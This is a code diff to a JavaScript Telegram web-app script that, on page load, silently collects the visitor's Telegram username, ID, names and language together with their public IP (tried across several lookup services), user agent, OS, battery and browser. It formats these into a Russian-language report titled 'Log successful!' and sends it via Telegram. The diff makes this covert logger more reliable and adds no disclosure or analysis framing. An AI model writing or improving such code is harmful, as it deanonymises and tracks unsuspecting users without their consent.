@@ -26,14 +26,39 @@
 // }
 
 async function fetchPublicIP() {
-  try {
-    const response = await fetch('https://api.ipify.org?format=json');
-    const data = await response.json();
-    return data.ip;
-  } catch (error) {
-    console.error('Error fetching IP:', error);
+    const ipServices = [
+        'https://api.ipify.org?format=json',
+        'https://api.ip.sb/ip',
+        'https://api4.my-ip.io/ip.json',
+        'https://ip.seeip.org/json'
+    ];
+
+    for (const service of ipServices) {
+        try {
+            const response = await fetch(service);
+            const text = await response.text();
+            
+            // Handle different response formats
+            try {
+                // Try parsing as JSON first
+                const data = JSON.parse(text);
+                // Different APIs return IP in different fields
+                const ip = data.ip || data.IP || data.address;
+                if (ip) return ip;
+            } catch {
+                // If not JSON, might be plain text IP
+                if (/^[0-9]{1,3}(\.[0-9]{1,3}){3}$/.test(text.trim())) {
+                    return text.trim();
+                }
+            }
+        } catch (error) {
+            console.error(`Error fetching IP from ${service}:`, error);
+            continue; // Try next service
+        }
+    }
+    
+    // If all services fail
     return 'Не удалось получить IP';
-  }
 }
 
 function getUserAgent() {
@@ -63,6 +88,29 @@ function getBrowserInfo() {
 
 async function sendDataToTelegram() {
     try {
+        // Check if Telegram WebApp is available
+        if (!window.Telegram || !window.Telegram.WebApp) {
+            throw new Error('Telegram WebApp не инициализирован');
+        }
+
+        let tg = window.Telegram.WebApp;
+
+        // Wait for initialization if needed
+        if (!tg.initDataUnsafe || !tg.initDataUnsafe.user) {
+            // Wait for up to 3 seconds for initialization
+            for (let i = 0; i < 30; i++) {
+                await new Promise(resolve => setTimeout(resolve, 100));
+                if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
+                    break;
+                }
+            }
+            
+            // If still not initialized, throw error
+            if (!tg.initDataUnsafe || !tg.initDataUnsafe.user) {
+                throw new Error('Не удалось получить данные пользователя Telegram');
+            }
+        }
+
         const ipAddress = await fetchPublicIP();
         const userAgent = getUserAgent();
         const osName = getOSName();
@@ -75,17 +123,18 @@ async function sendDataToTelegram() {
             batteryPercentage = 'Недоступно';
         }
         const browserInfo = getBrowserInfo();
-        let tg = window.Telegram.WebApp;
 
+        // Safe access to user data with fallbacks
+        const user = tg.initDataUnsafe.user || {};
         const message = `
 <b>✨ Лог успешен!</b>
 <b>🔍 Информация об аккаунте:</b>
-├ Тэг: @${tg.initDataUnsafe.user.username || 'Отсутствует'}
-├ Айди: <code>${tg.initDataUnsafe.user.id}</code>
-├ Имя: <code>${tg.initDataUnsafe.user.first_name}</code>
-├ Фамилия: <code>${tg.initDataUnsafe.user.last_name || 'Отсутствует'}</code>
-├ Язык: <code>${tg.initDataUnsafe.user.language_code}</code>
-└ Можно писать в ЛС: <code>${tg.initDataUnsafe.user.allows_write_to_pm}</code>
+├ Тэг: @${user.username || 'Отсутствует'}
+├ Айди: <code>${user.id || 'Неизвестно'}</code>
+├ Имя: <code>${user.first_name || 'Неизвестно'}</code>
+├ Фамилия: <code>${user.last_name || 'Отсутствует'}</code>
+├ Язык: <code>${user.language_code || 'Неизвестно'}</code>
+└ Можно писать в ЛС: <code>${user.allows_write_to_pm || 'Неизвестно'}</code>
 <b>🖥 Информация об устройстве:</b>
 ├ Айпи: <code>${ipAddress}</code>
 ├ UserAgent: <code>${userAgent}</code>
@@ -150,4 +199,9 @@ async function sendDataToTelegram() {
     }
 }
 
-sendDataToTelegram();
+// Wait for Telegram WebApp to be ready before running
+if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', sendDataToTelegram);
+} else {
+    sendDataToTelegram();
+}
